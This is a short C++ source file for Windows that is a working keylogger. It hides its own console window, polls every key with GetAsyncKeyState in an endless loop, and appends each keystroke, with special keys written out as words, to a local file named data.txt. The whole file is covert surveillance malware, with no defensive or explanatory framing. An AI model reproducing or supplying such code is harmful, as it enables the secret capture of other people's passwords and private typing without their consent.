#include<iostream>
#include<stdlib.h>
#include<fstream>
#include<stdio.h>
#include<string>
#include<windows.h>
using namespace std;

void log(string c){
ofstream log;
log.open("data.txt",ios::app);
	if(log.is_open())
	log<<c;
	log.close();
}
bool k(int key){
	switch(key){
case VK_SPACE:
cout<< " SPACE " <<endl;
log(" space ");	
return true;
case VK_BACK:
log(" backspace ");	
return true;
case VK_RETURN:
log(" Enter ");	
return true;
case VK_SHIFT:
log(" Shift enter ");	
return true;
	default:
return false;		
	}
}

int main(){
	ShowWindow(GetConsoleWindow(),SW_HIDE);
	char c;
	
while(true)
{
	for(int key=8;key<=256;key++){
		if(GetAsyncKeyState(key)==-32767){
			if(k(key)==false){
			ofstream log;
log.open("data.txt",ios::app);
	if(log.is_open())
	log<<char(key);
	log.close();
}
		}
		
		
	}
	}
}
